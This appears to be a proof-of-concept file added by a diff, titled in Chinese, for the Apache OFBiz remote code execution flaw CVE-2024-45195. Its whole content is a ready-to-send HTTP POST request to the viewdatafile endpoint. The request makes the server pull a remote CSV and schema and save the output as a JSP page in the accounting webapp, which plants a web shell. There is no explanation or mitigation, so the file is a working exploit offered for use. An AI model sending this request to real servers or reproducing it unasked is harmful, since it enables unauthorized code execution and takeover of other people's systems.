@@ -1,0 +1,14 @@
+# Apache OFBiz 远程代码执行漏洞(CVE-2024-45195)
+POST /webtools/control/forgotPassword/viewdatafile HTTP/1.1
+Host: www.xwd_test.com
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 SE 2.X MetaSr 1.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 239
+
+DATAFILE_LOCATION=http://127.0.0.1:8012/rcereport.csv&DATAFILE_SAVE=./applications/accounting/webapp/accounting/index.jsp&DATAFILE_IS_URL=true&DEFINITION_LOCATION=http://127.0.0.1:80/rceschema.xml&DEFINITION_IS_URL=true&DEFINITION_NAME=rce
